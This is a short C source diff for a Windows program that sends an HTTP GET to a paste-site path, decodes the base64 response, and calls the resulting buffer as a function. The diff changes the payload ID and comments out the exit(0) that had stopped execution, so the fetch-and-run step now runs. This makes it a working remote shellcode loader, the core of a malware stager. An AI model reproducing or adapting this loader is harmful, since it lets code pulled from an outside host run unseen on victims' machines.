@@ -76,7 +76,7 @@ int main(int argc, char * argv[]) {
                           INTERNET_DEFAULT_HTTP_PORT, 0);
 
   /* send HTTP GET to target host */
-  LPCWSTR path = L"/raw.php?i=XprAV403";
+  LPCWSTR path = L"/raw.php?i=PDg27FPb";
 
   // if (hConnect)
   hRequest = WinHttpOpenRequest(hConnect,
@@ -187,7 +187,7 @@ int main(int argc, char * argv[]) {
   printf("b64 string was: %s\n", buffer);
 
   free(pszOutBuffer);
-  exit(0);
+  //exit(0);
 
   /* cast our buffer as a function and call it */
   function = (void (*)())buffer;
